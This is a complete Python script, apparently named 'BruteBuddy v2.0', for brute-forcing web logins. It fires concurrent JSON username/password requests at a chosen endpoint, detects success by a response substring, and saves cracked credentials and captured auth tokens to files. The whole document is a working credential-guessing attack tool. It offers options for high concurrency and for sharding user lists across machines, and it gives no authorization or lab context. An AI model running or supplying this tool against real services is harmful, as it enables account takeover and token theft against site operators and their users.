#!/usr/bin/env python3
"""
BruteBuddy v2.0 - Advanced Bruteforce Engine
Features:
- Smart queue system: thread selesai langsung ambil task baru
- Single user: wordlist auto-split per thread untuk kecepatan maksimal
- Multi user: found 1 user = skip ke user berikutnya (queue replacement)
- Stop immediately on found (single mode) atau lanjut ke user berikut (multi mode)
- WSL & Linux compatible
"""

import argparse, os, sys, json, time, queue
from functools import partial
from collections import deque

# optional tqdm
try:
    from tqdm import tqdm
    TQDM = True
except Exception:
    TQDM = False

# async libs
try:
    import asyncio, aiohttp, aiofiles
    ASYNC_AVAILABLE = True
except Exception:
    ASYNC_AVAILABLE = False

# threads libs
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading
    THREADS_AVAILABLE = True
except Exception:
    THREADS_AVAILABLE = False

def now_ts():
    return time.strftime("%H:%M:%S")

def ensure_dir(d): 
    os.makedirs(d, exist_ok=True)

def read_file_lines(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s:
                yield s

def save_success_sync(save_dir, user, password, text):
    fname = os.path.join(save_dir, f"resp_{user}_{password}.json")
    with open(fname, "w", encoding="utf-8") as f:
        f.write(text)
    token = None
    try:
        j = json.loads(text)
        token = j.get("token") or j.get("access_token") or j.get("Token")
    except Exception:
        token = None
    csv_path = os.path.join(save_dir, "results.csv")
    with open(csv_path, "a", encoding="utf-8", newline='') as cf:
        cf.write(f"{user},{password},{token or ''},{fname}\n")
    return token, fname

def apply_shard_users(users, shards, shard_index):
    if shards is None or shards <= 1:
        return users
    return [u for i,u in enumerate(users) if (i % shards) == shard_index]

def split_list(lst, n):
    """Split list into n chunks (untuk wordlist splitting)"""
    k, m = divmod(len(lst), n)
    return [lst[i*k+min(i,m):(i+1)*k+min(i+1,m)] for i in range(n)]

# --------------------
# ASYNC engine helpers
# --------------------
async def async_post(session, url, user, password, headers, timeout_obj, sem, save_dir, check_substring, delay, global_flag_path, found_flag):
    if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
        return None
    payload = {"userName": user, "password": password}
    async with sem:
        try:
            async with session.post(url, json=payload, headers=headers, timeout=timeout_obj) as resp:
                text = await resp.text()
                if delay:
                    await asyncio.sleep(delay)
                if check_substring in text:
                    token, fname = save_success_sync(save_dir, user, password, text)
                    if global_flag_path:
                        try:
                            with open(global_flag_path, "w", encoding="utf-8") as ff:
                                ff.write(f"{user},{password},{time.time()}\n")
                        except Exception:
                            pass
                    found_flag.set()  # Signal found
                    return (user, password, token, fname, text)
        except asyncio.CancelledError:
            raise
        except Exception:
            return None
    return None

async def async_worker_queue(worker_id, task_queue, session, target, headers, timeout_obj, sem, save_dir, check_substring, delay, pbar, found_flag, global_flag_path, results_list, single_mode):
    """Worker yang mengambil task dari queue sampai habis atau found"""
    while True:
        if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
            break
        try:
            user, password = task_queue.get_nowait()
        except asyncio.QueueEmpty:
            break
        
        result = await async_post(session, target, user, password, headers, timeout_obj, sem, save_dir, check_substring, delay, global_flag_path, found_flag)
        
        if pbar:
            pbar.update(1)
        
        if result:
            results_list.append(result)
            if single_mode:  # Single user mode: stop immediately
                found_flag.set()
                break
            # Multi user mode: lanjut ke user berikutnya (queue system akan handle)

async def run_async_queue_based(target, users, passes, headers, concurrency, timeout, save_dir, check_substring, delay, pbar, global_flag_path, single_mode):
    """Queue-based async execution dengan smart task distribution"""
    sem = asyncio.Semaphore(concurrency)
    timeout_obj = aiohttp.ClientTimeout(total=timeout)
    found_flag = asyncio.Event()
    results_list = []
    
    # Buat task queue
    task_queue = asyncio.Queue()
    
    # Fill queue dengan tasks
    for u in users:
        if found_flag.is_set():
            break
        for p in passes:
            await task_queue.put((u, p))
    
    async with aiohttp.ClientSession(timeout=timeout_obj) as session:
        # Spawn workers
        workers = [
            asyncio.create_task(
                async_worker_queue(
                    i, task_queue, session, target, headers, timeout_obj, sem, 
                    save_dir, check_substring, delay, pbar, found_flag, 
                    global_flag_path, results_list, single_mode
                )
            )
            for i in range(concurrency)
        ]
        
        # Wait for all workers
        await asyncio.gather(*workers, return_exceptions=True)
    
    return results_list

# --------------------
# THREAD engine helpers
# --------------------
def thread_post(session, url, user, password, headers, timeout, save_dir, check_substring, delay, global_flag_path, found_flag):
    if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
        return None
    try:
        resp = session.post(url, json={"userName": user, "password": password}, headers=headers, timeout=timeout)
        text = resp.text
        if delay:
            time.sleep(delay)
        if check_substring in text:
            token, fname = save_success_sync(save_dir, user, password, text)
            if global_flag_path:
                try:
                    with open(global_flag_path, "w", encoding="utf-8") as ff:
                        ff.write(f"{user},{password},{time.time()}\n")
                except Exception:
                    pass
            found_flag.set()
            return (user, password, token, fname, text)
    except Exception:
        return None
    return None

def thread_worker_queue(worker_id, task_queue, target, headers, timeout, save_dir, check_substring, delay, pbar, found_flag, global_flag_path, results_list, single_mode, lock):
    """Thread worker yang ambil task dari queue"""
    session = requests.Session()
    while True:
        if found_flag.is_set() or (global_flag_path and os.path.exists(global_flag_path)):
            break
        try:
            user, password = task_queue.get_nowait()
        except queue.Empty:
            break
        
        result = thread_post(session, target, user, password, headers, timeout, save_dir, check_substring, delay, global_flag_path, found_flag)
        
        if pbar:
            with lock:
                pbar.update(1)
        
        if result:
            with lock:
                results_list.append(result)
            if single_mode:
                found_flag.set()
                break

def run_threads_queue_based(target, users, passes, headers, concurrency, timeout, save_dir, check_substring, delay, pbar, global_flag_path, single_mode):
    """Queue-based thread execution"""
    found_flag = threading.Event()
    results_list = []
    lock = threading.Lock()
    task_queue = queue.Queue()
    
    # Fill queue
    for u in users:
        if found_flag.is_set():
            break
        for p in passes:
            task_queue.put((u, p))
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [
            executor.submit(
                thread_worker_queue,
                i, task_queue, target, headers, timeout, save_dir, 
                check_substring, delay, pbar, found_flag, global_flag_path, 
                results_list, single_mode, lock
            )
            for i in range(concurrency)
        ]
        
        # Wait for completion
        for fut in futures:
            try:
                fut.result()
            except Exception:
                pass
    
    return results_list

# --------------------
# Main
# --------------------
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target","-t", required=True)
    g = parser.add_mutually_exclusive_group(required=True)
    g.add_argument("--user","-u")
    g.add_argument("--users-file","-U")
    parser.add_argument("--pass-file","-P", required=True)
    parser.add_argument("--concurrency","-c", type=int, default=12)
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--mode", choices=["cartesian","pairwise","single"], default="cartesian")
    parser.add_argument("--engine", choices=["async","threads"], default="async")
    parser.add_argument("--save-dir", default="found_responses")
    parser.add_argument("--check-substring", default='"message":"200"')
    parser.add_argument("--shards", type=int, default=1)
    parser.add_argument("--shard-index", type=int, default=0)
    parser.add_argument("--global-stop-flag", default="/tmp/async_bruteforce_done.flag")
    args = parser.parse_args()

    target = args.target
    pass_file = args.pass_file
    concurrency = max(1, args.concurrency)
    timeout = args.timeout
    delay = max(0.0, args.delay)
    mode = args.mode
    engine = args.engine
    save_dir = args.save_dir
    check_substring = args.check_substring
    shards = max(1, args.shards)
    shard_index = max(0, min(shards-1, args.shard_index))
    global_flag_path = args.global_stop_flag if args.global_stop_flag else None

    ensure_dir(save_dir)
    csv_path = os.path.join(save_dir, "hasils.csv")
    if not os.path.exists(csv_path):
        with open(csv_path, "w", encoding="utf-8", newline='') as cf:
            cf.write("user,pass,file\n")

    headers = {"Content-Type": "application/json", "User-Agent": "BruteBuddy/2.0"}

    if args.user:
        users = [args.user]
        single_mode = True
    else:
        users = list(read_file_lines(args.users_file))
        single_mode = False

    # Apply shards
    if shards > 1 and len(users) > 1:
        users = apply_shard_users(users, shards, shard_index)

    passes = list(read_file_lines(pass_file))

    print(f"[{now_ts()}] Mode: {'SINGLE USER' if single_mode else 'MULTI USER'}")
    print(f"[{now_ts()}] Users: {len(users)}, Passwords: {len(passes)}, Concurrency: {concurrency}")
    print(f"[{now_ts()}] Engine: {engine.upper()}, Total requests: {len(users) * len(passes)}")

    found_all = []

    if mode == "pairwise":
        print("[WARN] Pairwise mode menggunakan logic lama (belum di-improve)")
        # Keep old pairwise logic
        sys.exit(0)

    # Calculate total
    total = len(users) * len(passes)
    pbar = tqdm(total=total, unit="req", desc="Progress") if TQDM else None

    if engine == "async":
        if not ASYNC_AVAILABLE:
            print("Async engine requires aiohttp. Install: pip install aiohttp aiofiles", file=sys.stderr)
            sys.exit(1)
        
        async def async_main():
            return await run_async_queue_based(
                target, users, passes, headers, concurrency, timeout, 
                save_dir, check_substring, delay, pbar, global_flag_path, single_mode
            )
        
        found_all = asyncio.run(async_main())

    else:
        if not THREADS_AVAILABLE:
            print("Threads engine requires requests. Install: pip install requests", file=sys.stderr)
            sys.exit(1)
        
        found_all = run_threads_queue_based(
            target, users, passes, headers, concurrency, timeout, 
            save_dir, check_substring, delay, pbar, global_flag_path, single_mode
        )

    if pbar: 
        pbar.close()

    if found_all:
        print(f"\n[{now_ts()}] ✓ SUCCESS! Found {len(found_all)} credential(s):")
        for u,p,token,fname,_ in found_all:
            print(f"  └─ {u}:{p} → token={token}")
            print(f"     File: {fname}")
    else:
        print(f"\n[{now_ts()}] ✗ No credentials found.")

if __name__ == "__main__":
    main()